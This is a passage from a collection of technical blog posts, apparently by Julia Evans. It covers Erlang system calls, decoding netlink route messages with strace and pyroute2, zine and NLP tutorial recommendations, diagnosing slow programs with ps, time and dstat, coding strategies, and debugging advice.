. \n\n When you look at the system call frequencies, you can see that Erlang is running significantly different  kinds  of system calls than Java and Python and C. Those 3 languages are mostly doing  open ,  read ,  lseek ,  stat ,  mmap ,  mprotect ,  fstat  – all activities around reading a bunch of files & allocating memory, which is what I think of as normal behavior when starting a program. \n\n The top 2 syscalls for the Erlang process are  futex  and  sched_yield . So there’s a lot of synchronization happening (the futex), and the operating system threads Erlang starts up keep scheduling themselves off the CPU “ok, I’m done, you go!”. There are also a lot of mysterious-to-me  ppoll  system calls. So Erlang seems like a programming language with really significantly different primitives. \n\n This highly concurrent behavior is consistent with what Wikipedia article says: \n\n \n Erlang’s main strength is support for concurrency. It has a small but powerful\nset of primitives to create processes and communicate among them. \n \n\n Let’s look a little more carefully at these  ppoll  system calls for a second. The story starts with \n\n 8682  openat(AT_FDCWD, \"/sys/devices/system/node/node0\", O_RDONLY|O_NONBLOCK|O_DIRECTORY|O_CLOEXEC) = 4\n8703  ppoll([{fd=4, events=POLLIN|POLLRDNORM}, {fd=0, events=POLLIN|POLLRDNORM}], 2, {0, 0}, NULL, 8) = 0 (Timeout)\n \n\n I have no idea what  /sys/devices/system/node/node0  is, but it seems to be a directory and what  ppoll  is looking for changes to? I don’t really get this at all. \n\n One last thing – erlang runs  bind  once when it starts. Why does it need to listen on a TCP socket to run hello world? I was very confused about this and unable to figure it out. Some people on twitter thought it might have something to do with  epmd , but  epmd  seems to be a separate process. So I don’t know what’s going on. \n\n <3 operating systems \n\n I wanted to write this down because, as you all very well know, I think it’s interesting to take an operating systems-level approach to understanding what a program is doing and I thought this was a cool example of that. \n\n I had this interesting experience yesterday where I was looking at this Erlang problem with Victor and David and they had OS X machines and I was like “dude I can’t debug anything on OS X”. So we got it working on my laptop and then I could make a lot more progress. Because now I’m pretty good at OS-level debugging tools, and I’ve spent a lot of time learning about Linux, and so I’m not super comfortable on non-Linux systems. (I know, I know, dtrace is amazing, I’m going to learn it one day soon, I promise :) ) \n\n"},
{"url": "https://jvns.ca/blog/2017/09/03/debugging-netlink-requests/", "title": "Debugging netlink requests", "content": "\n     \n\n This week I was working on a Kubernetes networking problem. Basically\nour container network backend was reporting that it couldn’t delete\nroutes, and we didn’t know why. \n\n I started reading the code that was failing, and it was using a library\ncalled “netlink”. I’d never heard of that before this week. \n\n what’s netlink? \n\n Wikipedia says: \n\n \n Netlink socket family is a Linux kernel interface used for\ninter-process communication (IPC) between both the kernel and\nuserspace processes, and between different userspace processes, in a\nway similar to the Unix domain sockets. \n \n\n The program I was debugging was creating/deleting routes from the route table.\nIt seems like netlink is capable of doing lots of things (communicate kernel\n<-> userspace and userspace <-> userspace), but in this case what was happening\nwas pretty simple \n\n \n userspace program creates a netlink socket \n userspace program sends a message with that socket asking the kernel\nto delete a route \n kernel deletes the route (or in our case, fails and returns an error message) \n \n\n how to see netlink messages with strace \n\n Let’s create some netlink messages! Luckily this is easy: if we use the\n ip  tool to create and delete a route, it uses netlink. \n\n ip route add 172.16.5.0/24 via 127.0.0.1 dev lo\nip route del 172.16.5.0/24 via 127.0.0.1 dev lo\n \n\n Cool, let’s strace it! Here’s the command: \n\n strace -s 100 -f -o out -x ip route add 172.16.5.0/24 via 127.0.0.1 dev lo\n \n\n and the output: \n\n socket(PF_NETLINK, SOCK_RAW|SOCK_CLOEXEC, NETLINK_ROUTE) = 3\nbind(3, {sa_family=AF_NETLINK, pid=0, groups=00000000}, 12) = 0\ngetsockname(3, {sa_family=AF_NETLINK, pid=13058, groups=00000000},\nsendmsg(3, {msg_name(12)={sa_family=AF_NETLINK, pid=0, groups=00000000},\n    msg_iov(1)=[{\"\\x34\\x00\\x00\\x00\\x18\\x00\\x05\\x06\\x6e\\xbc\\xac\\x59\\x00\\x00\\x00\\x00\\x02\\x18\\x00\\x00\\xfe\\x03\\x00\\x01\\x00\\x00\\x00\\x00\\x08\\x00\\x01\\x00\\xac\\x10\\x05\\x00\\x08\\x00\\x05\\x00\\x7f\\x00\\x00\\x01\\x08\\x00\\x04\\x00\\x01\\x00\\x00\\x00\",\n    52}], msg_controllen=0, msg_flags=0}, 0) = 52\nrecvmsg(3, {msg_name(12)={sa_family=AF_NETLINK, pid=0,\n    msg_iov(1)=[{\"\\x24\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x6e\\xbc\\xac\\x59\\x02\\x33\\x00\\x00\\x00\\x00\\x00\\x00\\x34\\x00\\x00\\x00\\x18\\x00\\x05\\x06\\x6e\\xbc\\xac\\x59\\x00\\x00\\x00\\x00\",\n    32768}], msg_controllen=0, msg_flags=0}, 0) = 36\n\n \n\n So we see that it: \n\n \n creates the netlink socket & binds to it \n sends a message ( \\x34\\x00... ) \n receives a response \n \n\n Okay, but what does that message  say ? Here’s the message again: \n\n \\x34\\x00\\x00\\x00\\x18\\x00\\x05\\x06\\x9e\\xbc\\xac\\x59\\x00\\x00\\x00\\x00\\x02\\x18\\x00\\x00\\xfe\\x03\\x00\\x01\\x00\\x00\\x00\\x00\\x08\\x00\\x01\\x00\\xac\\x10\\x05\\x00\\x08\\x00\\x05\\x00\\x7f\\x00\\x00\\x01\\x08\\x00\\x04\\x00\\x01\\x00\\x00\\x00\n \n\n Not super understandable, right? Well, luckily there’s a Python tool\nthat can help us understand it! We’ll save this to a file called\n message . \n\n decoding netlink messages with pyroute2 \n\n I googled how to decode netlink messages and I found this great page:\n http://docs.pyroute2.org/debug.html . \n\n Decoding my netlink message turned out to be pretty simple: I just had\nto run this: \n\n pip install pyroute2\nwget https://raw.githubusercontent.com/svinota/pyroute2/72e444714f37a313fb15bdb22734e517feefa9e9/tests/decoder/decoder.py\npython decoder.py pyroute2.netlink.rtnl.rtmsg.rtmsg message\n \n\n Here’s the output! \n\n {'attrs': [('RTA_DST', '172.16.5.0'),\n           ('RTA_GATEWAY', '127.0.0.1'),\n           ('RTA_OIF', 1)],\n 'dst_len': 24,\n 'family': 2,\n 'flags': 0,\n 'header': {'flags': 1541,\n            'length': 52,\n            'pid': 0,\n            'sequence_number': 1504493250,\n            'type': 24},\n 'proto': 3,\n 'scope': 0,\n 'src_len': 0,\n 'table': 254,\n 'tos': 0,\n 'type': 1}\n \n\n I don’t understand all of this but we’re just going to focus on this part: \n\n {'attrs': [('RTA_DST', '172.16.5.0'),\n           ('RTA_GATEWAY', '127.0.0.1'),\n           ('RTA_OIF', 1)],\n \n\n The dst and gateway fields are pretty easy to understand there! \n\n why the program I was debugging wasn’t working \n\n You see this  RTA_OIF  field? This field is a  network interface id . For\nexample, on my laptop right now I have 5 network interfaces, numbered 1 through\n5. The (correct) message above has  RTA_OIF  set to 1, for the  lo  loopback interface. \n\n 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n2: enp0s25: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP mode DEFAULT group default qlen 1000\n    link/ether 3c:97:0e:55:b3:7f brd ff:ff:ff:ff:ff:ff\n3: wlp3s0: <BROADCAST,MULTICAST> mtu 1500 qdisc mq state DOWN mode DORMANT group default qlen 1000\n    link/ether 60:67:20:eb:7b:bc brd ff:ff:ff:ff:ff:ff\n4: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN mode DEFAULT group default \n    link/ether 02:42:a0:c5:c1:be brd ff:ff:ff:ff:ff:ff\n5: nlmon0: <NOARP,UP,LOWER_UP> mtu 3776 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1\n    link/netlink \n \n\n But in our errant program, the  RTA_OIF  field was set to 0! 0 is not even a\nvalid value for this field, I don’t think! (0 is not a valid network interface ID) \n\n pyroute2 is great \n\n pyroute2 is really cool, if I wanted to write a quick script to understand\nwhat’s going on with my network interfaces & routes I would 100% definitely try\npyroute2. There are a lot of  great examples here . \n\n For example! If I want to run the equivalent of  ip route add 172.16.5.0/24 via 127.0.0.1 dev lo , that’s: \n\n from pyroute2 import IPRoute\nip = IPRoute()\nip.route('add',\n         dst='172.16.0.0/24',\n         gateway='127.0.0.1',\n         oif=1)\n \n\n Super simple!  oif=1  means the same as  dev lo . \n\n other ways to capture netlink messages: tcpdump + wireshark \n\n You can also use tcpdump to capture netlink messages! here’s how: \n\n # create the network interface\nsudo ip link add  nlmon0 type nlmon\nsudo ip link set dev nlmon0 up\nsudo tcpdump -i nlmon0 -w netlink.pcap # capture your packets\nwireshark netlink.pcap # look at the results with wireshark\n \n\n I tried this but had trouble for a couple reasons \n\n \n It didn’t work for me on the server I was working on (though it works on my laptop now) \n I actually found it harder to work with than the strace method – it captured too many packets and I found it hard to filter them in Wireshark. \n \n\n ip monitor \n\n You can also run  ip monitor  and it’ll tell you some netlink requests. when I run it it prints out this stuff: \n\n $ sudo ip monitor\nfd68:29:f8f6::1 dev enp0s25 lladdr c4:6e:1f:95:d8:3e router STALE\nfe80::c66e:1fff:fe95:d83e dev enp0s25 lladdr c4:6e:1f:95:d8:3e router STALE\n192.168.1.144 dev enp0s25 lladdr 14:30:c6:ba:e4:6c STALE\n192.168.1.144 dev enp0s25 lladdr 14:30:c6:ba:e4:6c PROBE\n192.168.1.144 dev enp0s25 lladdr 14:30:c6:ba:e4:6c STALE\n192.168.1.144 dev enp0s25 lladdr 14:30:c6:ba:e4:6c REACHABLE\nfd68:29:f8f6::1 dev enp0s25 lladdr c4:6e:1f:95:d8:3e router PROBE\nfd68:29:f8f6::1 dev enp0s25 lladdr c4:6e:1f:95:d8:3e router REACHABLE\nfe80::c66e:1fff:fe95:d83e dev enp0s25 lladdr c4:6e:1f:95:d8:3e router PROBE\nfe80::c66e:1fff:fe95:d83e dev enp0s25 lladdr c4:6e:1f:95:d8:3e router REACHABLE\n \n\n It didn’t give me the information I wanted though. \n\n nltrace \n\n There’s also  nltrace  (for instance  nltrace ip route list ) but in this case it didn’t give me the information I wanted. It’s not a maintained project but looks maybe useful! \n\n that’s all! \n\n It always makes me happy when I learn about a NEW LINUX THING during the course\nof my job. When I was in the middle of this I tweeted \n\n \n kubernetes is cool but definitely not easy, my experience is definitely like\n“learn how all the networking works in excruciating detail” \n \n\n which definitely feels true, it’s less like “set up networking and it works”\nand more like “pick a networking backend, wait a month, discover weird\nproblems, strace it, learn things about netlink and what a  RTA_OIF  is, fix\nthe bugs, eventually it works”. Maybe that isn’t everyone’s experience but that\nis my experience so far! \n\n"},
{"url": "https://jvns.ca/blog/2017/05/02/like-zines-about-computers--you-might-love-bubblesort-zines/", "title": "Like zines about computers? You might love Bubblesort Zines", "content": "\n     \n\n Hello! As you have probably noticed, I make zines about computers!\nSometimes I hear from people who are excited about my zines, and want\nto show them to their kids! This is cool, but kids aren’t really my\ntarget audience, so they’re not always the perfect fit! \n\n So. If you are excited about adorable computer\nscience zines for kids / teenagers (or even for adults!), you should\nknow about  Bubblesort Zines  by  Amy Wibowo !\nThis is an ever-growing (7 and counting!) collection of zines aimed at teenage\ngirls. Teenage girls are smart and curious people who are interested\nin learning complicated things about science & technology! (and also\noften like adorable drawings, like, who doesn’t?) \n\n Like when I was 13, I was so interested in learning about programming\ncomputers, but I didn’t know where to start! I learned to program when\nmy math teacher gave me a programmable graphing calculator when I was\n15. \n\n I’m especially excited today about her  Pixel Perfect \nzine about image processing, which she just released. It’s about: \n\n \n how Instagram filters work, how a computer can help you dither or\nsimplify an image to recreate it as cross stitch, knitting, or a lego\nmural, how Snapchat can detect a face to put a flower crown on your\nhead, and other image processing topics! \n \n\n I don’t know how any of that stuff works! I ordered it and I’m really\nexcited to read it. \n\n awesome zine on how the internet works! \n\n Recently I reread her zine on how the Internet works called “ How does the internet ” and I remembered how much I loved it, so I wanted to tell\nall of you how great I think it is and why. \n\n In this 50-page zine, she explains a bunch of old communication methods\n(like carrier pigeons & torches!), how modern computer networking needs\nto solve a lot of the same problems (“what happens if messages get\nlost?”) and some of the details of how computer networking works\n(“computers address messages to each other using IP addresses!”). \n\n I find the range of topics she covered really impressive: \n\n \n How people used to use carrier pigeons to send messages \n How the ancient Greeks used torches to spell out messages! \n Morse code! \n IP addresses! \n How data travels over the internet using wires & wireless! \n The idea of checksums! \n DNS, TCP, and HTTP! \n How TCP packets get routed over the internet! \n HTML! \n \n\n and she explains all these things in a clear and fun way without dumbing\ndown the ideas. It doesn’t tell you everything about computer\nnetworking, but I definitely didn’t understand the basics of how TCP\nworked when I was teenager learning HTML (or even when I started working\nas a professional web developer!), and maybe if I did I would have\nunderstood better what was happening behind the scenes when I started\nusing HTML and making Geocities sites when I was 14! \n\n ❤ smart, friendly, inclusive zines ❤ \n\n In addition to explaining complicated+interesting topics in a clear and\nfun way (which is my favorite thing in the world), I think the mission\nof her zines is really important. Here’s a quote from the Bubblesort\nZines  About Us \npage: \n\n \n Computer science and programming are powerful tools for expressing\ncreativity and for actuating change. Let’s make sure that these tools\n& skills are accessible to everyone. […] This means framing computer\nscience in a way that is accessible and inclusive to people who might\nnot think there is a place for them in computer science. \n \n\n Basically the goal of these zines, as I understand it, is to show people\n(especially-but-not-only teenage girls) that interesting computer\nscience concepts like encryption, image processing, and computer\nnetworking can be for them. \n\n I think that’s really important, and I’m really delighted to see such\nhigh-quality explanations presented in a smart and friendly way that’s\nvery different from the traditional way CS material is presented. Often\nmaterial that’s written for young people gets dumbed down or doesn’t go\ninto all the interesting details, but of course 13-14 year olds can\nunderstand a lot of complex concepts, as long as you explain them\nclearly! \n\n If, like me, you think this is awesome, here are some links: \n\n \n Bubblesort Zines store . The zines that are out so far are:\n\n \n Bubble sort and other sorts  (on sorting algorithms!) \n How do do calculators even  (on how calculators work!!!) \n Literal Twitter Bot  (instructions for how to make a fun electronics project with a tweeting bird!!) \n How does the internet \n Cache Cats  (how computer memory works!) \n Pixel Perfect  (image processing!!) \n Secret Messages  (cryptography!) \n \n Her great Twitter account:  @sailorhg \n Her  kickstarter campaign from last year  has a lot of great pictures of the zines \n Amazing  10-year career retrospective  (she’s worked on so many interesting projects!) \n \n\n She’s continuing to produce more awesome zines so it’s worth following\nher updates! \n\n"},
{"url": "https://jvns.ca/blog/2017/06/17/allison-parrish/", "title": "Awesome NLP tutorials by Allison Parrish", "content": "\n     \n\n I love fun programming tutorials, and I love the Jupyter notebook for showing how to do cool Python stuff. So I was\nreally happy this morning when I saw  Allison Parrish  (who makes a lot of delightful\ncomputer-generated language art) post these tutorials she’s written (which mostly use the Jupyter notebook) about how to parse and generate English text this morning! \n\n First, some links to cool stuff Allison has done: \n\n \n her awesome website with a billion cool links \n Her !!Con talk  lossy text compression, for some reason?!?!  (which is basically about using JPEG compression to compress text, with weird and wonderful results. It’s 10 minutes, watch it, really) \n The Ephemerides  is a lovely Twitter bot that posts computer-generated poems and pictures from space \n everyword  tweeted every word in the English language \n awesome transcript of “Exploring (Semantic) Space With (Literal) Robots” , a talk by her about computer-generated poetry. \n A game called  rewordable  that I want to buy \n \n\n And now the tutorials! To start, there’s this a  basic intro to  working with CSV files in Python  (which is extremely useful, but I know that. \n\n Here are the links to the 4 tutorials I was really excited about if you just want the links and don’t care what I have to say about them :) \n\n \n Tracery tutorial \n Working with Tracery in Python \n NLP concepts with spaCy \n Understanding word vectors \n \n\n Text generation \n\n First! Suppose you want to generate random text, like “I’m a banana, not a cucumber”. You could do this by writing like  \"I'm a %s, not a %s\" % (\"banana\", \"cucumber\") , but you’ll run into problems fast because it’s “I’m  an  apple”, not “I’m a apple”. \n\n It turns out that there’s a cool library called Tracery to help you with text generation. Allison has 2 cool tutorials about Tracery: \n\n \n Tracery tutorial \n Working with Tracery in Python \n \n\n Parsing text with spaCy \n\n The next tutorial is  NLP concepts with spaCy . Basically you can take a sentence or paragraph and parse it to figure out what it means! Some example of stuff she explains how to figure out: \n\n Where the sentences are\nWhether a word is a verb or a noun or what\nIdentify more complicated grammar constructs like the “prepositional phrases”  (‘with reason and conscience’, ‘towards one another’) \n\n She linked to some  examples  of how to use spacy. I ran the “what they’re doing” example on Pride and Prejudice and it wrote out: \n\n Hurst is returning\nBingley is blaming\nCollins is coming\nDarcy is viewing\nBingley is providing\nWickham is caring\nDarcy is viewing\nLady is remaining\nHill is coming\n \n\n So it seems to have done a good job of identifying the characters in Pride and\nPrejudice! Neat! \n\n Previously the NLP library I’d heard about was NLTK, and she has this very\nuseful note in the tutorial: \n\n \n (Traditionally, most NLP work in Python was done with a library called NLTK.\nNLTK is a fantastic library, but it’s also a writhing behemoth: large and\nslippery and difficult to understand. Also, much of the code in NLTK is decades\nout of date with contemporary practices in NLP.) \n \n\n Understanding word vectors \n\n Ok, the next tutorial is  Understanding word vectors \n\n The cool thing I learned from this is that you can programmatically “average”\nwords like ‘day’ and ‘night’ to end up with ‘evening’! You can also figure out\nwhich animals are similar and all kinds of really cool stuff. I didn’t know\nthat you could do this, if you want to know more you should read the excellent\ntutorial. \n\n Fun building blocks for doing text experiments! \n\n I think these 3 things (tracery for generating sentences, spacy for parsing\ntext, and spacy (again) for seeing which words are similar to each other) seem\nlike a super awesome way to get started with playing with text! \n\n"},
{"url": "https://jvns.ca/blog/2015/03/15/nancy-drew-and-the-case-of-the-slow-program/", "title": "Nancy Drew and the Case of the Slow Program", "content": "\n      Yesterday I tweeted: \n\n you have three slow\nprograms:\n1. CPU-bound\n2. waiting for slow network\nresponses\n3. writing a lot to disk\nhow do you tell which is\nwhich? — Julia Evans (@b0rk)  March 14,\n2015 \n \n\n I specifically wanted programming-language-independent ways to\ninvestigate questions like this, and I guess people who follow me on\ntwitter get me because I got SO MANY GREAT ANSWERS. I’ll give you a list\nof all the answers at the end, but first! We’re going to mount an\ninvestigation. \n\n Let’s start! I wrote up 3 example mystery programs, and you can find\nthem in this\n github repository . \n\n Mystery Program #1 \n\n Let’s investigate our first mystery slow program! \n\n \n\n First, let’s check  how long it takes  using  time : \n\n $ time python mystery_1.py\n0.09user 0.01system 0:02.11elapsed 5%CPU (0avgtext+0avgdata 52064maxresident)\n \n\n We can already see by timing the program  that a) it takes 2 seconds and\nb) it’s only on the CPU for 5% of that time. So we already know it’s\nwaiting for something! But what is it waiting for? \n\n What is Mystery Program #1 waiting for? \n\n First, we’ll use a rough tool:  ps  can tell us what every process is\ncurrently waiting for. It gives you a piece of information called\n wchan , which the internet defines as “wait channel. The address of an\nevent on which a particular process is waiting.” \n\n So, let’s start the program and then call  ps -eo pid,wchan:42,cmd  to\nget the PID, current waiting channel, and command for each process. (the\n42 is so it doesn’t cut off any information) \n\n I actually ran it in a loop ( ps -eopid,wchan:42,cmd; sleep 0.5  so that\nI wouldn’t miss anything) \n\n $ ps -eo pid,wchan:42,cmd | grep mystery_1.py\n2382 sk_wait_data                               python mystery_1.py\n \n\n The internet \ntells us that  sk_wait_data  means “Wait for some data on a network\nsocket.“. So it seems likely that it’s slow because it’s waiting for a\nnetwork response! AWESOME. \n\n You can see  the source for mystery_1.py  if you want to know what it’s actually doing. \n\n Mystery Program #2 \n\n time , again, is a great place to start. \n\n $ time python mystery_2.py\n2.74user 0.00system 0:02.74elapsed 99%CPU (0avgtext+0avgdata 18032maxresident)k\n \n\n This program is spending all of its runtime on the CPU (2. 74 ⁄ 2 .74\nseconds), and it’s all in user functions. The operating system won’t\nhave anything new to tell us here (no IO! No network!), and since it’s\nPython (and not, say, C++) it’s actually going to be best to just use a\nPython profiler. \n\n It’s important to know when you  shouldn’t  use fancy operating systems\ntools to debug performance, and I think this is one of those cases. \n\n You can see  the source for mystery_2.py \nif you want to know what it’s actually doing. \n\n Mystery program #3 \n\n time python mystery_3.py \n0.08user 1.03system 0:10.61elapsed 10%CPU (0avgtext+0avgdata 18176maxresident)k\n \n\n This one is waiting for 9 seconds. What’s going on?! I actually\noriginally thought I understood this one but I TOTALLY DIDN’T. \n\n To thicken the plot, if we run the program twice in a row, it takes\ndrastically different amounts of time: \n\n $ time python mystery_3.py \n0.01user 0.40system 0:00.61elapsed 69%CPU (0avgtext+0avgdata 18176maxresident)k\n0inputs+585944outputs (0major+1239minor)pagefaults 0swaps\n$ time python mystery_3.py \n0.01user 0.34system 0:10.55elapsed 3%CPU (0avgtext+0avgdata 18176maxresident)k\n24inputs+585944outputs (0major+1238minor)pagefaults 0swaps\n \n\n It just went from 0.6 seconds to 10 seconds! What in the world is going on? \n\n I tried this  wchan  trick again, and ran our mystery program a few times \n\n $ for i in `seq 1 100`\ndo\n    ps -eo pid,wchan:42,cmd | grep mystery_3; sleep 0.5\nend\n\n11285 -                                          python mystery_3.py\n11285 sleep_on_buffer                            python mystery_3.py\n11285 sleep_on_buffer                            python mystery_3.py\n11285 sleep_on_buffer                            python mystery_3.py\n11410 sleep_on_page                              python mystery_3.py\n11438 sleep_on_shadow_bh                         python mystery_3.py\n \n\n All of this buffer and page business is enough for me to conclude that\nthere’s  something  going on with IO. But what, and why does it run so\nmuch more slowly the second time? I was actually totally confused about\nthis, even though I knew what the program was doing. \n\n Here’s the program. It’s writing 287MB to  /tmp/fake.txt . \n\n line = 'a' * 30000\nfilename = '/tmp/fake.txt'\n\nwith open(filename, 'w') as f:\n    for i in xrange(10000):\n        f.write(line)\n \n\n The whole point of this exercise is to debug using our operating system,\nso we need to get a better picture of what the OS is doing! Let’s use\n dstat , which gives us snapshots every second of what network, IO, and\nCPU activity is happening (SO GREAT) \n\n $ dstat\n----total-cpu-usage---- -dsk/total- -net/total- ---paging-- ---system--\nusr sys idl wai hiq siq| read  writ| recv  send|  in   out | int   csw \n 14   5  78   3   0   0|  46k  342k|   0     0 |   0  1629B| 374  1282 \n  3   1  95   1   0   0|   0   232k|   0     0 |   0     0 | 606  2807 \n  3   2  95   0   0   0|   0     0 | 164B  204B|   0     0 | 444  2093 \n \n\n I’m going to just show you the disk stats using  dstat -d  for clarity. It prints a new line every second. \n\n $ dstat -d \n-dsk/total-\n read  writ\n   0   136k\n   0    56M <-- when I start python mystery_3.py. It finishes immediately\n   0    46M <-- but it's still writing data!\n   0    32M <-- still writing...\n   0    52M <-- still writing...\n   0    70M <-- still writing...\n   0    32M <-- still writing...\n   0   148k <-- okay it's done\n   0     0 \n   0   144k\n   0     0 \n   0   144k^\n \n\n So we see that the OS is writing data even after the program is\nfinished. For 5 whole seconds! This was when a lightbulb went off in my\nhead going OH FILESYSTEM CACHES RIGHT. Writing to disks is  super\nslow , and the kernel loves you and wants you to not have to wait. So\nit says “okay, got it!”, but doesn’t actually write the data to disk\nuntil a little later. \n\n When the filesystem cache runs out of space, it says “okay you need to\nstop writing now” and actually writes the data to disk and makes you\nwait until it’s done. Of course, sometimes you want your data to be\n*actually for serious written before you keep on going (for example if\nyou’re a database!!). This is why the second run of our program takes so\nlong! It needs to wait for the writes from the previous run to finish,\nand also catch up on its own. \n\n Kamal  wisely suggested that I could\nforce the kernel to do finish all the writes before the program\nfinishes: \n\n import os\nline = 'a' * 30000\nfilename = '/home/bork/fake.txt'\n\nwith open(filename, 'w') as f:\n    for i in xrange(10000):\n        f.write(line)\n    f.flush()\n    os.fsync(f.fileno())\n \n\n time python writes2.py \n0.02user 0.32system 0:06.70elapsed 5%CPU (0avgtext+0avgdata\n18192maxresident)k\n \n\n Surprise: it takes about 6.5 seconds. every time. Which is exactly what\nwe’d expect from looking at our dstat output above! I have other\nSerious Questions about why my hard drive only writes at 40MB/s but that\nwill be for another time. \n\n All of the performance tools \n\n I got SO MANY ANSWERS. holy crap you guys. I’m going to write down every\ntool someone recommended here so I don’t forget them, though you can\nalso just  read the Twitter replies . \n\n \n nethogs ,  nettop , and  jnettop  for network performance \n iotop  is top, but for IO! Awesome! \n iostat  and  lsof  too for seeing what’s up with IO and files right now \n top  and  htop  for CPU stats, of course (pro tip: use htop instead of top) \n strace  because  we <3 strace \n perf  is  a magical tool that can do anything \n atop  which I don’t even understand what it is \n pidstat  is an amazing program for looking at both CPU and disk activity which we’re going to explain a little more later \n ps xaopid,wchan:42,cmd  is this amazing  ps  incantation  Aria Stewart  told me which tells you what  every process is currently doing . whoa. \n vmstat which I’m not totally sure what it is yet \n dstat  is like iotop and nethogs and top all rolled into one and I’m\nsuper into it. \n Brendan Gregg’s great picture of Linux observability tools \nwhich is awesome as a reference but honestly I have a really hard time learning new things from it. I need examples! \n \n\n Twitter is the bomb and I learned about at least 5 awesome tools I\nhadn’t heard of before (nethogs, iotop, pidstat, dstat, and this  ps\n-eo wchan  business) \n\n that’s all for now! \n\n I’m working on a talk about this for PyCon 2015 next month, so there\nshould be more posts along these lines coming your way :) :) :) \n\n many many thanks to Aria Stewart, Brendan Gregg, Kamal Marhubi, and\nothers for telling me about some of these amazing tools! \n"},
{"url": "https://jvns.ca/blog/2013/12/28/coding-strategies/", "title": "Coding strategies", "content": "\n      In reply to “Write the README first, then the code”,\n Lindsey Kuper  pointed me to\nthese great slides by Simon Peyton-Jones on\n how to write a research paper (pdf) :\nWrite the paper first, then do the research. \n\n One of the hardest and most memorable coding exercises that I’ve done\nwas to spend 30 minutes writing code that I really thought was good,\nand then delete it. \n\n Another super fun thing is to pair and have one person write the\ntests and the other person write the code. \n\n Coding strategies: write code for 25 minutes, then git reset --hard no matter what happens — Julia Evans (@b0rk)  December 29, 2013 \n\n Coding strategies: write the README first, then the code — Julia Evans (@b0rk)  December 29, 2013 \n\n Coding strategies: pretend you have the code already, and write a program using it — Julia Evans (@b0rk)  December 29, 2013 \n\n Coding strategies: code without using the internet for an hour — Julia Evans (@b0rk)  December 29, 2013 \n\n Coding strategies: talk to someone about your code for 15 minutes — Julia Evans (@b0rk)  December 29, 2013 \n\n Coding strategies: explain what you're doing to someone who doesn't know how to program — Julia Evans (@b0rk)  December 29, 2013 \n\n Coding strategies: go read someone else's code. think about why you don't like it. — Julia Evans (@b0rk)  December 29, 2013 \n\n Coding strategies: blog about your coding problems — Julia Evans (@b0rk)  December 29, 2013 \n\n Coding strategies: code for 30 minutes without thinking about whether it's good or not — Julia Evans (@b0rk)  December 29, 2013 \n\n Erik  also started tweeting coding strategies!\nHe is the best. I especially like “ride a bicycle until you are\nout-of-breath on the other side of town.” \n\n Coding strategies: try unselfconsciously following your instincts. — Eiríkr Åsheim (@d6)  December 29, 2013 \n\n Coding strategies: set a goal for yourself (perf, immutability, type safety, terseness, whatever) and try prioritizing it above all else. — Eiríkr Åsheim (@d6)  December 29, 2013 \n\n Coding strategies: try self-consciously interrogating every decision and design you make. — Eiríkr Åsheim (@d6)  December 29, 2013 \n\n Coding strategies: watch \"the five obstructions\" then apply similar challenges to your code. — Eiríkr Åsheim (@d6)  December 29, 2013 \n\n Coding strategies: port someone else's code to a new language to learn about their code and/or the other language. — Eiríkr Åsheim (@d6)  December 29, 2013 \n\n Coding strategies: ride a bicycle until you are out-of-breath on the other side of town. — Eiríkr Åsheim (@d6)  December 29, 2013 \n\n Coding strategies: try using property-based testing and test coverage to determine every possible way your code can fail. — Eiríkr Åsheim (@d6)  December 29, 2013 \n\n To sum up my coding strategies: avoid dogma, question conventional wisdom, try new things, be idealistic, improve, and have fun. — Eiríkr Åsheim (@d6)  December 29, 2013 \n\n \n\n"},
{"url": "https://jvns.ca/blog/2019/06/23/a-few-debugging-resources/", "title": "What does debugging a program look like?", "content": "\n     \n\n I was debugging with a friend who’s a relatively new programmer yesterday, and showed them a few\ndebugging tips. Then I was thinking about how to teach debugging this morning, and  mentioned on\nTwitter  that I’d never seen a really good\nguide to debugging your code.  (there are a ton of really great replies by Anne Ogborn to that tweet\nif you are interested in debugging tips) \n\n As usual, I got a lot of helpful answers and now I have a few ideas about how to teach debugging\nskills / describe the process of debugging. \n\n a couple of debugging resources \n\n I was hoping for more links to debugging books/guides, but here are the 2 recommendations I\ngot: \n\n “Debugging” by David Agans : Several people recommended the book\n Debugging , which looks like a nice and fairly short book that explains\na debugging strategy. I haven’t read it yet (though I ordered it to see if I should be recommending\nit) and the rules laid out in the book (“understand the system”, “make it fail”, “quit thinking and\nlook”, “divide and conquer”, “change one thing at a time”, “keep an audit trail”, “check the plug”,\n“get a fresh view”, and “if you didn’t fix it, it ain’t fixed”) seem extremely resaonable :).  He\nalso has a charming  debugging poster . \n\n “How to debug” by John Regehr :  How to Debug  is a very\ngood blog post based on Regehr’s experience teaching a university embedded systems course. Lots of\ngood advice.  He also has a  blog post reviewing 4 books about debugging , including Agans’ book. \n\n reproduce your bug (but how do you do that?) \n\n The rest of this post is going to be an attempt to aggregate different ideas about debugging\npeople tweeted at me. \n\n Somewhat obviously, everybody agrees that being able to consistently reproduce a bug is important if\nyou want to figure out what’s going on. I have an intuitive sense for how to do this but I’m not\nsure how to  explain  how to go from “I saw this bug twice” to “I can consistently reproduce this\nbug on demand on my laptop”, and I wonder whether the techniques you use to do this depend on the\ndomain (backend web dev, frontend,  mobile, games, C++ programs, embedded etc). \n\n reproduce your bug  quickly \n\n Everybody also agrees that it’s extremely useful be able to reproduce the bug quickly (if it takes\nyou 3 minutes to check if every change helped, iterating is VERY SLOW). \n\n A few suggested approaches: \n\n \n for something that requires clicking on a bunch of things in a browser to reproduce, recording\nwhat you clicked on with  Selenium  and getting Selenium to replay\nthe UI interactions (suggested  here ) \n writing a unit test that reproduces the bug (if you can). bonus: you can add this to your test\nsuite later if it makes sense \n writing a script / finding a command line incantation that does it (like  curl MY_APP.local/whatever ) \n \n\n accept that it’s probably your code’s fault \n\n Sometimes I see a problem and I’m like “oh, library X has a bug”, “oh, it’s DNS”, “oh, SOME OTHER\nTHING THAT IS NOT MY CODE is broken”. And sometimes it’s not my code! But in general between an\nestablished library and my code that I wrote last month, usually it’s my code that I wrote last\nmonth that’s the problem :). \n\n start doing experiments \n\n @act_gardner gave a  nice, short explanation of what you have to do after you reproduce your\nbug \n\n \n I try to encourage people to first fully understand the bug - What’s happening? What do you expect\nto happen? When does it happen? When 